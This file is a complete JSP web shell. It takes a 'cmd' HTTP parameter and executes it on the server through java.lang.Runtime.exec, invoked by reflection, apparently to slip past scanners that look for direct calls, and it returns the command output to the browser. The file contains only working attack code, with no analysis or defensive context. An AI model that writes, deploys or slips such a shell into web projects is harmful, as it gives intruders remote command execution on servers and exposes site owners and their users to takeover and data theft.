<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // advance
    String cmd = request.getParameter("cmd");
    Process process = (Process) Class.forName("java.lang.Runtime")
            .getMethod("exec", String.class)
            .invoke(Class.forName("java.lang.Runtime")
                            .getMethod("getRuntime").invoke(null), cmd);
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>